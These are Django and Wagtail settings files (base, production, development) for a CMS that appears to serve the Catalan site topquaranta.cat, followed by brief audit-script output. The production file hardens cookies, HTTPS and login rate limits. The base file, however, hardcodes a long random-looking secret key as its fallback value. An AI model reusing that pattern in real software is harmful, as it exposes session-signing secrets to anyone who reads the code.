+---- tqcms/settings/base.py (1–180) ----
+     1	"""
+     2	Django settings for tqcms project.
+     3	
+     4	Generated by 'django-admin startproject' using Django 5.2.5.
+     5	
+     6	For more information on this file, see
+     7	https://docs.djangoproject.com/en/5.2/topics/settings/
+     8	
+     9	For the full list of settings and their values, see
+    10	https://docs.djangoproject.com/en/5.2/ref/settings/
+    11	"""
+    12	
+    13	# Build paths inside the project like this: os.path.join(BASE_DIR, ...)
+    14	import os
+    15	
+    16	from dotenv import load_dotenv
+    17	
+    18	load_dotenv("/root/TopQuaranta_Local/.env")
+    19	
+    20	PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    21	BASE_DIR = os.path.dirname(PROJECT_DIR)
+    22	
+    23	# Carrega variables d'entorn des de .env a l'arrel del projecte
+    24	load_dotenv(os.path.join(BASE_DIR, ".env"))
+    25	
+    26	# DEBUG/Hosts/CSRF des de .env
+    27	DEBUG = os.getenv("DJANGO_DEBUG", "false").lower() == "true"
+    28	SECRET_KEY = os.getenv(
+    29	    "DJANGO_SECRET_KEY",
+    30	    "9_LzFKHXCrNsPLiVusmQnTVlswrvwexYchMyvyXMHT6WNrTl9rr7jtP6EqmFD20XHtFEOiMd4VeN2TnthKNrKA",
+    31	)
+    32	ALLOWED_HOSTS = [
+    33	    h.strip() for h in os.getenv("DJANGO_ALLOWED_HOSTS", "").split(",") if h.strip()
+    34	]
+    35	
+    36	# Django 5 requereix esquema (http/https)
+    37	CSRF_TRUSTED_ORIGINS = [
+    38	    o.strip()
+    39	    for o in os.getenv("DJANGO_CSRF_TRUSTED_ORIGINS", "").split(",")
+    40	    if o.strip()
+    41	]
+    42	SECURE_PROXY_SSL_HEADER = ("HTTP_X_FORWARDED_PROTO", "https")
+    43	
+    44	# Quick-start development settings - unsuitable for production
+    45	# See https://docs.djangoproject.com/en/5.2/howto/deployment/checklist/
+    46	
+    47	
+    48	# Application definition
+    49	
+    50	INSTALLED_APPS = [
+    51	    "home",
+    52	    "wagtail.contrib.forms",
+    53	    "wagtail.contrib.redirects",
+    54	    "wagtail.embeds",
+    55	    "wagtail.sites",
+    56	    "wagtail.users",
+    57	    "wagtail.snippets",
+    58	    "wagtail.documents",
+    59	    "wagtail.images",
+    60	    "wagtail.search",
+    61	    "wagtail.admin",
+    62	    "wagtail",
+    63	    # "wagtail_modeladmin",
+    64	    "modelcluster",
+    65	    "taggit",
+    66	    "django.contrib.admin",
+    67	    "django.contrib.auth",
+    68	    "django.contrib.contenttypes",
+    69	    "django.contrib.sessions",
+    70	    "django.contrib.messages",
+    71	    "django.contrib.staticfiles",
+    72	    "wagtail.contrib.settings",
+    73	    "django.contrib.sites",
+    74	    "allauth",
+    75	    "allauth.account",
+    76	    "allauth.socialaccount",
+    77	    "allauth.socialaccount.providers.google",
+    78	    "allauth.socialaccount.providers.instagram",
+    79	    "allauth.socialaccount.providers.spotify",
+    80	]
+    81	
+    82	DEFAULT_AUTO_FIELD = "django.db.models.BigAutoField"
+    83	
+    84	MIDDLEWARE = [
+    85	    "django.middleware.security.SecurityMiddleware",
+    86	    "whitenoise.middleware.WhiteNoiseMiddleware",
+    87	    "django.contrib.sessions.middleware.SessionMiddleware",
+    88	    "django.middleware.common.CommonMiddleware",
+    89	    "django.middleware.csrf.CsrfViewMiddleware",
+    90	    "django.contrib.auth.middleware.AuthenticationMiddleware",
+    91	    "django.contrib.messages.middleware.MessageMiddleware",
+    92	    "django.middleware.clickjacking.XFrameOptionsMiddleware",
+    93	    "allauth.account.middleware.AccountMiddleware",
+    94	    "wagtail.contrib.redirects.middleware.RedirectMiddleware",
+    95	]
+    96	
+    97	AUTHENTICATION_BACKENDS = (
+    98	    "django.contrib.auth.backends.ModelBackend",
+    99	    "allauth.account.auth_backends.AuthenticationBackend",
+   100	)
+   101	
+   102	ROOT_URLCONF = "tqcms.urls"
+   103	
+   104	TEMPLATES = [
+   105	    {
+   106	        "BACKEND": "django.template.backends.django.DjangoTemplates",
+   107	        "DIRS": [
+   108	            os.path.join(PROJECT_DIR, "templates"),
+   109	        ],
+   110	        "APP_DIRS": True,
+   111	        "OPTIONS": {
+   112	            "context_processors": [
+   113	                "django.template.context_processors.debug",
+   114	                "django.template.context_processors.request",
+   115	                "django.contrib.auth.context_processors.auth",
+   116	                "django.contrib.messages.context_processors.messages",
+   117	                "wagtail.contrib.settings.context_processors.settings",
+   118	            ],
+   119	        },
+   120	    },
+   121	]
+   122	
+   123	WSGI_APPLICATION = "tqcms.wsgi.application"
+   124	
+   125	
+   126	# Database
+   127	# https://docs.djangoproject.com/en/5.2/ref/settings/#databases
+   128	
+   129	DATABASES = {
+   130	    "default": {
+   131	        "ENGINE": "django.db.backends.postgresql",
+   132	        "HOST": os.getenv("DB_HOST", "localhost"),
+   133	        "PORT": os.getenv("DB_PORT", "5432"),
+   134	        "NAME": os.getenv("DB_NAME", "topquaranta"),
+   135	        "USER": os.getenv("DB_USER", "topquaranta"),
+   136	        "PASSWORD": os.getenv("DB_PASSWORD", ""),
+   137	    }
+   138	}
+   139	
+   140	
+   141	# Password validation
+   142	# https://docs.djangoproject.com/en/5.2/ref/settings/#auth-password-validators
+   143	
+   144	AUTH_PASSWORD_VALIDATORS = [
+   145	    {
+   146	        "NAME": "django.contrib.auth.password_validation.UserAttributeSimilarityValidator",
+   147	    },
+   148	    {
+   149	        "NAME": "django.contrib.auth.password_validation.MinimumLengthValidator",
+   150	    },
+   151	    {
+   152	        "NAME": "django.contrib.auth.password_validation.CommonPasswordValidator",
+   153	    },
+   154	    {
+   155	        "NAME": "django.contrib.auth.password_validation.NumericPasswordValidator",
+   156	    },
+   157	]
+   158	
+   159	
+   160	# Internationalization
+   161	# https://docs.djangoproject.com/en/5.2/topics/i18n/
+   162	
+   163	LANGUAGE_CODE = "ca"
+   164	
+   165	TIME_ZONE = "Europe/Madrid"
+   166	
+   167	USE_I18N = True
+   168	
+   169	USE_TZ = True
+   170	
+   171	
+   172	# Static files (CSS, JavaScript, Images)
+   173	# https://docs.djangoproject.com/en/5.2/howto/static-files/
+   174	
+   175	STATICFILES_FINDERS = [
+   176	    "django.contrib.staticfiles.finders.FileSystemFinder",
+   177	    "django.contrib.staticfiles.finders.AppDirectoriesFinder",
+   178	]
+   179	
+   180	STATICFILES_DIRS = [
+---- tqcms/settings/production.py (1–160) ----
+     1	# web_cms/tqcms/settings/production.py
+     2	import os
+     3	
+     4	from .base import *
+     5	
+     6	# ── SECRET_KEY des de .env i validació mínima ────────────────────────────────
+     7	SECRET_KEY = os.getenv("DJANGO_SECRET_KEY", "")
+     8	if len(SECRET_KEY) < 50 or SECRET_KEY.startswith("django-insecure-"):
+     9	    raise RuntimeError(
+    10	        "Configureu DJANGO_SECRET_KEY a .env amb una clau llarga i aleatòria (>= 50 caràcters)."
+    11	    )
+    12	
+    13	DEBUG = False
+    14	
+    15	# ── Proxy/TLS darrere de Caddy ────────────────────────────────────────────────
+    16	USE_X_FORWARDED_HOST = True
+    17	SECURE_PROXY_SSL_HEADER = ("HTTP_X_FORWARDED_PROTO", "https")
+    18	
+    19	# ── Hosts i CSRF ──────────────────────────────────────────────────────────────
+    20	ALLOWED_HOSTS = [
+    21	    "www.topquaranta.cat",
+    22	    "topquaranta.cat",
+    23	    "localhost",
+    24	    "127.0.0.1",
+    25	]
+    26	
+    27	PREPEND_WWW = True
+    28	
+    29	CSRF_TRUSTED_ORIGINS = [
+    30	    "https://www.topquaranta.cat",
+    31	    "https://topquaranta.cat",
+    32	]
+    33	
+    34	
+    35	# ── Cookies segures ──────────────────────────────────────────────────────────
+    36	SESSION_COOKIE_SECURE = True
+    37	CSRF_COOKIE_SECURE = True
+    38	SESSION_COOKIE_HTTPONLY = True  # ja és True per defecte, però ho fem explícit
+    39	SESSION_COOKIE_SAMESITE = "Lax"
+    40	CSRF_COOKIE_SAMESITE = "Lax"
+    41	
+    42	# ── Seguretat en prod ────────────────────────────────────────────────────────
+    43	SECURE_SSL_REDIRECT = True
+    44	SECURE_CONTENT_TYPE_NOSNIFF = True
+    45	X_FRAME_OPTIONS = "SAMEORIGIN"
+    46	SECURE_REFERRER_POLICY = "strict-origin-when-cross-origin"
+    47	
+    48	# HSTS: comença curt i puja quan estiga tot OK (p.ex. 30d → 180d → 365d)
+    49	SECURE_HSTS_SECONDS = 31536000
+    50	SECURE_HSTS_INCLUDE_SUBDOMAINS = True
+    51	SECURE_HSTS_PRELOAD = True
+    52	
+    53	# ── Wagtail ──────────────────────────────────────────────────────────────────
+    54	WAGTAILADMIN_BASE_URL = "https://www.topquaranta.cat"
+    55	
+    56	# ── Email (SMTP real via .env) ───────────────────────────────────────────────
+    57	EMAIL_BACKEND = os.getenv(
+    58	    "EMAIL_BACKEND", "django.core.mail.backends.smtp.EmailBackend"
+    59	)
+    60	EMAIL_HOST = os.getenv("EMAIL_HOST", "")
+    61	EMAIL_PORT = int(os.getenv("EMAIL_PORT", "587"))
+    62	EMAIL_HOST_USER = os.getenv("EMAIL_HOST_USER", "")
+    63	EMAIL_HOST_PASSWORD = os.getenv("EMAIL_HOST_PASSWORD", "")
+    64	EMAIL_USE_TLS = os.getenv("EMAIL_USE_TLS", "true").lower() == "true"
+    65	DEFAULT_FROM_EMAIL = os.getenv("DEFAULT_FROM_EMAIL", "")
+    66	SERVER_EMAIL = os.getenv("SERVER_EMAIL", DEFAULT_FROM_EMAIL)
+    67	
+    68	# ── Autenticació (si uses allauth) ───────────────────────────────────────────
+    69	ACCOUNT_EMAIL_VERIFICATION = "mandatory"
+    70	ACCOUNT_DEFAULT_HTTP_PROTOCOL = "https"
+    71	ACCOUNT_UNIQUE_EMAIL = True  # correus únics
+    72	# —— Allauth rate limits (substitueix intents de login deprecats) ——
+    73	ACCOUNT_RATE_LIMITS = {
+    74	    # màxim 5 intents fallits per IP/usuari cada 5 minuts
+    75	    "login_failed": "5/5m",
+    76	    # opcionalment limita signup/reset si vols
+    77	    # "signup": "10/h",
+    78	    # "reset_password": "5/15m",
+    79	}
+    80	
+    81	# ── Logging a consola (ideal per a containers/systemd) ───────────────────────
+    82	LOGGING = {
+    83	    "version": 1,
+    84	    "disable_existing_loggers": False,
+    85	    "formatters": {
+    86	        "simple": {
+    87	            "format": "[{levelname}] {asctime} {name}: {message}",
+    88	            "style": "{",
+    89	        }
+    90	    },
+    91	    "handlers": {
+    92	        "console": {"class": "logging.StreamHandler", "formatter": "simple"},
+    93	    },
+    94	    "root": {"handlers": ["console"], "level": "INFO"},
+    95	    "loggers": {
+    96	        "django": {"handlers": ["console"], "level": "INFO"},
+    97	        "django.server": {"handlers": ["console"], "level": "INFO", "propagate": False},
+    98	    },
+    99	}
+   100	
+   101	# Assume https by default for URLField (prepara Django 6)
+   102	FORMS_URLFIELD_ASSUME_HTTPS = True
+   103	
+   104	SILENCED_SYSTEM_CHECKS = ["security.W019"]
+---- tqcms/settings/dev.py (1–160) ----
+     1	from .base import *
+     2	
+     3	# SECURITY WARNING: don't run with debug turned on in production!
+     4	DEBUG = True
+     5	
+     6	# SECURITY WARNING: keep the secret key used in production secret!
+     7	SECRET_KEY = "django-insecure-n9bt@7&kt3wzwgk0skt4%x19u#kkmtr1#z*jk^94p-=gl@uzfn"
+     8	
+     9	# SECURITY WARNING: define the correct hosts in production!
+    10	ALLOWED_HOSTS = ["*"]
+    11	
+    12	EMAIL_BACKEND = "django.core.mail.backends.console.EmailBackend"
+    13	
+    14	
+    15	try:
+    16	    from .local import *
+    17	except ImportError:
+    18	    pass
+
+==== 🧷 SnippetChooserBlock — on s’usa ====
+No s'usa SnippetChooserBlock (o no hi ha coincidències).
+
+==== 🧾 Llistat breu d’arxius CSS principals (sense contingut) ====
+No hi ha carpeta static/
